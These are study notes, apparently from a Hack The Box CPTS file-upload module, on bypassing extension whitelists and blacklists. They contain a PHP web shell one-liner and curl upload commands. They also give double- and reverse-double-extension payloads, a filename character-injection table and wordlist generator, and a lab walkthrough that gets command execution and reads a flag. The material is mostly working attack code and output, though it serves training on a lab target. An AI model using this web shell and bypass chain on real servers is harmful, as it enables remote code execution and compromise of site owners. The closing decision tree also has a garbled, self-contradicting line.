# Section 6 — Whitelist Filter Bypass

---

## Why Whitelists Sometimes Still Fail

Whitelists are stronger than blacklists, but only as strong as the regex behind them. Common mistake — checking *contains* an allowed extension, not *ends with* it:

```php
// Vulnerable — no $ anchor
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) { reject(); }

// Fixed — $ requires extension at end
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { reject(); }
```

The vulnerable form matches `shell.jpg.php` because it contains `.jpg`. Even with the proper `$` anchor, Apache's PHP handler regex may have the same bug — enabling reverse double-extension.

---

## Bypass 1 — Double Extension (`shell.jpg.php`)

Works when the whitelist matches **contains** rather than **ends with**.

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/sh.php
curl -X POST "http://TARGET/upload.php" \
  -F "uploadFile=@/tmp/sh.php;filename=shell.jpg.php"
```

Outcome:
- Whitelist regex sees `.jpg` in the name → passes
- File stored as `shell.jpg.php`
- Apache sees `.php` final extension → executes as PHP

---

## Bypass 2 — Reverse Double Extension (`shell.php.jpg`)

Works when the whitelist is tight (`$`-anchored), but Apache's PHP handler regex is loose:

```apache
# /etc/apache2/mods-enabled/php7.4.conf
<FilesMatch ".+\.ph(ar|p|tml)">      ← no $ anchor!
    SetHandler application/x-httpd-php
</FilesMatch>
```

`shell.php.jpg`:
- Whitelist: ends with `.jpg` → passes ✓
- Apache PHP handler: contains `.ph(ar|p|tml)` → handler fires → executes as PHP ✓

```bash
curl -X POST "http://TARGET/upload.php" \
  -F "uploadFile=@/tmp/sh.php;filename=shell.php.jpg"
# Result: shell.php.jpg uploaded AND runs as PHP
```

Also works with `.phar.jpg`, `.phtml.jpg`, `.pht.jpg` — depending on what extensions the Apache handler config matches.

This lab's exercise uses **this exact misconfiguration** — `.phar.jpg` / `.phtml.jpg` execute, but `.php.jpg` is blocked by a parallel blacklist.

---

## Bypass 3 — Character Injection

Inject special chars to confuse the parser. Each works against specific server versions/configs:

| Injection | Server quirk |
|-----------|-------------|
| `shell.php%00.jpg` | PHP < 5.3.4 — null byte truncates name to `shell.php` |
| `shell.php%20` | Trailing space — some FS strip it after save → `.php` |
| `shell.php.` | Windows strips trailing dot → `.php` |
| `shell.php/` | Some parsers strip the slash |
| `shell.aspx:.jpg` | NTFS alternate data stream — file written as `shell.aspx` |
| `shell.php%0a.jpg` | Newline injection in filename |
| `shell.php\x00.jpg` | Raw null byte (Burp's "Smart decode" or hex edit) |

Generate variants in a wordlist:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\' '.' ':'; do
  for ext in '.php' '.phps' '.phar'; do
    echo "shell$char$ext.jpg" >> exts.txt
    echo "shell$ext$char.jpg" >> exts.txt
    echo "shell.jpg$char$ext" >> exts.txt
    echo "shell.jpg$ext$char" >> exts.txt
  done
done
```

Run via Burp Intruder / ffuf against the upload endpoint.

---

## Bypass 4 — Case Variants (Windows / case-insensitive)

Only works when the FS / web server is case-insensitive but the validation isn't:

```
shell.pHp.jpg
shell.PHP.jpg
shell.Phar.jpg
```

If the blacklist is `php`/`phar` strict-case and the FS treats `pHp` as `php`, the file is written as something PHP executes.

---

## Lab — Both Lists Combined Bypass

**Target:** `154.57.164.74:31466`

The app has both:
- **Blacklist** rejecting `.php`, `.phtml` direct uploads
- **Whitelist** requiring image extension somewhere in the filename

### Fuzz double-extension variants
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/sh.php

for name in sh.jpg.php sh.php.jpg sh.phar.jpg sh.phtml.jpg sh.pHp.jpg; do
  resp=$(curl -sk -X POST "http://154.57.164.74:31466/upload.php" \
    -F "uploadFile=@/tmp/sh.php;filename=$name")
  echo "[$name] $resp"
done
```

Results:
```
[sh.jpg.php]   Extension not allowed          ← blacklist catches .php at end
[sh.php.jpg]   Extension not allowed          ← blacklist catches .php anywhere
[sh.phar.jpg]  File successfully uploaded     ← .phar not in blacklist + .jpg passes whitelist
[sh.phtml.jpg] File successfully uploaded     ← same pattern
[sh.pHp.jpg]   File successfully uploaded     ← case-sensitive blacklist miss
```

### Test which actually executes
```bash
for name in sh.phar.jpg sh.phtml.jpg sh.pHp.jpg; do
  resp=$(curl -sk "http://154.57.164.74:31466/profile_images/$name?cmd=id")
  echo "[$name] ${resp:0:80}"
done
```

Results:
```
[sh.phar.jpg]  uid=33(www-data) gid=33(www-data) groups=33(www-data)   ✅
[sh.phtml.jpg] uid=33(www-data) gid=33(www-data) groups=33(www-data)   ✅
[sh.pHp.jpg]   <?php system($_REQUEST["cmd"]); ?>                      ❌ (text, no exec)
```

`.phar.jpg` and `.phtml.jpg` exploit the Apache handler's loose regex → execute as PHP. `.pHp.jpg` uploads but doesn't execute (server's PHP handler is case-sensitive even on Linux).

### Read flag
```bash
curl -sk "http://154.57.164.74:31466/profile_images/sh.phar.jpg?cmd=cat+/flag.txt"
# → HTB{1_wh173l157_my53lf}
```

**Flag:** `HTB{1_wh173l157_my53lf}`

---

## Decision Tree When Bypassing Both Lists

```
Direct .php → blocked? (blacklist)
  ↓ try
Alternate PHP extensions (.phar, .phtml) → blocked?
  ↓ try
Double extension shell.jpg.php → blocked? (proper whitelist)
  ↓ try
Reverse double extension shell.phar.jpg → uploads?
  ↓ check
Does shell.phar.jpg execute as PHP? (Apache handler regex bug)
  ↓ if no
Try character injection: shell.php%00.jpg, shell.php\x20.jpg, etc.
  ↓ if no
Pivot to content-type / magic-byte bypass (Section 6 next? No — Section 6 covered the type-based variant next)
```

---

## Exam Notes

- **Reverse double extension (`.phar.jpg`, `.phtml.jpg`)** is the canonical CPTS whitelist bypass — exploits Apache's loose PHP handler regex
- The vulnerability isn't really in the upload code — it's in `/etc/apache2/mods-enabled/php*.conf` missing the `$` anchor
- "Uploads" doesn't equal "executes" — always run a second test with `?cmd=id` to confirm
- `.phar` is the goldilocks extension: less likely to be on a blacklist than `.phtml`, but still triggers the Apache PHP handler
- Character injection (`%00`, `%20`, `.`) works on specific server versions — fuzz a wordlist of variants
- For Apache specifically: check `/etc/apache2/mods-enabled/` (LFI/wrapper from earlier modules) to confirm regex misconfiguration before crafting payloads
- This lab is a beautiful textbook example of why blacklists + loose handler regex = double failure
